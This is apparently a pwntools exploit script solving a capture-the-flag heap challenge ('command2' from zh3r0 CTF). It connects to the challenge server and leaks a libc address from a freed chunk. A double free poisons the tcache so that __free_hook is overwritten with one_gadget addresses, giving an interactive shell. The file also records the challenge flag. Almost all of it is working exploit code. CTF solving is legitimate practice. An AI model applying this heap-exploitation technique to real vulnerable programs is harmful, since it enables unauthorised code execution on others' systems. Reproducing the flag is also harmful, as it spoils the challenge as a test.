#exploit for command2
#flag=zh3r0{don't_let_heap_pwn_killed_dmmeyoursol}
from pwn import *
envi={"LD_PRELOAD":"/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so"}
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')

gadgets=[0x4f322,0x10a38c,0x10a398,0xe569f,0xe5863,0xe5858,0x4f2c5,0xe585f]

for gadget in gadgets:
	#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./chall'],env=envi)
	target=remote('asia.pwn.zh3r0.ml',7530)
	#context.terminal=["tmux","split","-h"]
	#gdb.attach(target,'''pie breakpoint *(0x101f-0x203000)''')
	#gdb.attach(target)
	def init(option):
		print(target.recvuntil("> "))
		target.sendline(str(option))

	def add(cmd,size,desc):
		init(1)
		print(target.recvuntil("> "))
		target.send(cmd)
		print(target.recvline())
		target.sendline(str(size))
		print(target.recvline())
		target.send(desc)
		print(target.recvline())
		
	def view(index):
		init(5)
		print(target.recvuntil("index: "))
		target.sendline(str(index))
		print(target.recvuntil("-> ["))
		leak1=target.recvline().strip("\n").strip("]")
		print(leak1)
		print(target.recvuntil("-> "))
		leak2=target.recvuntil("1")[0:6]
		print(leak2)
		return leak1,leak2

	def free(index):
		init(4)
		print(target.recvuntil("index: "))
		target.sendline(str(index))
		print(target.recvline())


	add("A\n",0x500,"A\n")#0
	add("A\n",0x38,"A\n")#1
	free(0)
	leak1,leak2=view(0)
	libc_leak=u64(leak2.ljust(8,"\x00"))
	libc_base=libc_leak-0x70-libc.symbols["__malloc_hook"]
	libc_free_hook=libc_base+libc.symbols["__free_hook"]
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	add("A\n",0x38,"A\n")#2
	free(1)
	free(2)
	free(1)
	add("A\n",0x38,p64(libc_free_hook)+"\n")#3
	add("A\n",0x38,"A"+"\n")#4
	add("A\n",0x38,"A"+"\n")#5
	add("A\n",0x38,p64(libc_gadget)+"\n")#6
	init(4)
	print(target.recvuntil("index: "))
	target.sendline("1")
	
	target.interactive()




